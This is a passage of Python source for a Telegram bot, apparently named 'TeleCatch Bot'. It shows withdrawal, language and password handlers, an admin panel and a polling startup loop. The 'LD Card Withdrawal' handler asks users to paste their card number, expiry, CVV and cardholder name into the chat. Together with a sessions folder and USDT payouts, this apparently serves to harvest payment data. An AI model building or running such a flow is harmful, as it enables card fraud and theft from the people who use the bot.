            bot.answer_callback_query(call.id, f"Language set to {LANGUAGES.get(language, language)}")
            bot.edit_message_text("✅ <b>Language updated successfully!</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML')
        else:
            bot.answer_callback_query(call.id, "Error setting language")
    
    elif data == 'withdraw_ld':
        user_data[user_id] = {'state': 'awaiting_ld_info'}
        bot.edit_message_text(
            "💳 <b>LD Card Withdrawal</b>\n\nPlease send your LD Card information in the following format:\n\n<code>Card Number|Expiry Date|CVV|Cardholder Name</code>",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
    
    elif data == 'withdraw_usdt':
        user_data[user_id] = {'state': 'awaiting_usdt_address'}
        bot.edit_message_text(
            "₿ <b>USDT Withdrawal</b>\n\nPlease send your USDT (BEP20) wallet address:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
    
    elif data == 'settings_language':
        handle_language(call.message)
        bot.answer_callback_query(call.id)
    
    elif data == 'settings_password':
        user_data[user_id] = {'state': 'awaiting_new_password'}
        bot.edit_message_text(
            "🔐 <b>Change Password</b>\n\nPlease enter your new withdrawal password:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

# ==================== ADMIN FUNCTIONS ====================
@bot.message_handler(commands=['admin'])
def handle_admin(message):
    """Admin panel"""
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ <b>Access denied.</b>", parse_mode='HTML')
        return
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📊 Statistics", callback_data="admin_stats"))
    markup.add(types.InlineKeyboardButton("👥 User Management", callback_data="admin_users"))
    markup.add(types.InlineKeyboardButton("🌍 Country Management", callback_data="admin_countries"))
    markup.add(types.InlineKeyboardButton("⚙️ System Settings", callback_data="admin_settings"))
    markup.add(types.InlineKeyboardButton("🔐 Password Management", callback_data="admin_passwords"))
    
    bot.send_message(message.chat.id, "👑 <b>Admin Panel</b>", reply_markup=markup, parse_mode='HTML')

# ==================== BOT STARTUP ====================
def check_bot_health():
    """Check if bot can access required resources"""
    try:
        # Test database connection
        conn = sqlite3.connect(DB_FILE)
        conn.close()
        
        # Test sessions folder
        if not os.path.exists(SESSIONS_FOLDER):
            os.makedirs(SESSIONS_FOLDER)
        
        logger.info("✅ Bot health check passed")
        return True
    except Exception as e:
        logger.error(f"❌ Bot health check failed: {e}")
        return False

if __name__ == "__main__":
    logger.info("Starting TeleCatch Bot...")
    
    if check_bot_health():
        logger.info("✅ Bot is healthy, starting polling...")
        
        # Start bot with error handling and retry logic
        while True:
            try:
                bot.infinity_polling(timeout=60, long_polling_timeout=60)
            except Exception as e:
                logger.error(f"Bot error: {e}")
                logger.info("Restarting bot in 10 seconds...")
                time.sleep(10)
    else:
        logger.error("❌ Bot failed health check. Exiting.")